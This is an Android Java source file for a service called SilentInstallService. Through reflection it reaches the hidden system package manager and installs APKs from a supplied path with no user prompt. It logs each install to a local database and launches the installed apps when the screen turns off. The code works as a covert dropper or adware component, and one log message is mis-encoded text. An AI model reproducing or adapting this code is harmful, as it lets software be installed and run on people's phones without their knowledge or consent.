package com.xstd.active.plugin;

import java.lang.reflect.Method;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import com.xstd.active.plugin.db.DBHelper;

public class SilentInstallService extends Service {

	private IPackageManager manager;
	private MyIPackageInstallObserver observer;
	private ScreenChangeReceiver receiver;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@SuppressWarnings({ "rawtypes", "unchecked" })
	@Override
	public void onCreate() {
		super.onCreate();
		receiver = new ScreenChangeReceiver();
		IntentFilter filter = new IntentFilter();
		filter.setPriority(Integer.MAX_VALUE);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.addAction(Intent.ACTION_USER_PRESENT);
		registerReceiver(receiver, filter);
		try {
			Class clazz = getClassLoader().loadClass(
					"android.os.ServiceManager");
			Method method = clazz.getMethod("getService",
					new Class[] { String.class });
			IBinder b = (IBinder) method.invoke(null, "package");
			manager = IPackageManager.Stub.asInterface(b);
			observer = new MyIPackageInstallObserver();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (receiver != null)
			unregisterReceiver(receiver);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		String path = intent.getStringExtra("apk_path");
		Uri packageURI = Uri.parse("file://" + path);
		try {
			manager.installPackage(packageURI, observer, 0, null);
		} catch (RemoteException e) {
			e.printStackTrace();
		}
		return super.onStartCommand(intent, flags, startId);
	}

	class MyIPackageInstallObserver extends IPackageInstallObserver.Stub {

		@Override
		public void packageInstalled(String packageName, int returnCode)
				throws RemoteException {
			Log.w("ps", "°²×°½áÊø:"+returnCode);
			if (returnCode == 1) {
				DBHelper helper = new DBHelper(getApplicationContext());
				SQLiteDatabase db = helper.getWritableDatabase();
				ContentValues values = new ContentValues();
				values.put("packname", packageName);
				values.put("active", 0);
				db.insert("silentapp", null, values);
			}
		}
	}

	class ScreenChangeReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (Intent.ACTION_SCREEN_ON.equals(action)) {

			} else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
				DBHelper helper = new DBHelper(getApplicationContext());
				SQLiteDatabase db = helper.getWritableDatabase();
				Cursor cursor = db.query("silentapp", null, "active=?", new String[]{String.valueOf(0)}, null, null, null);
				if(cursor.moveToNext()) {
					String packname = cursor.getString(1);
					Intent app = context.getPackageManager().getLaunchIntentForPackage(packname);
					context.startActivity(app);
				}
			} else if (Intent.ACTION_USER_PRESENT.equals(action)) {

			}
		}

	}

}
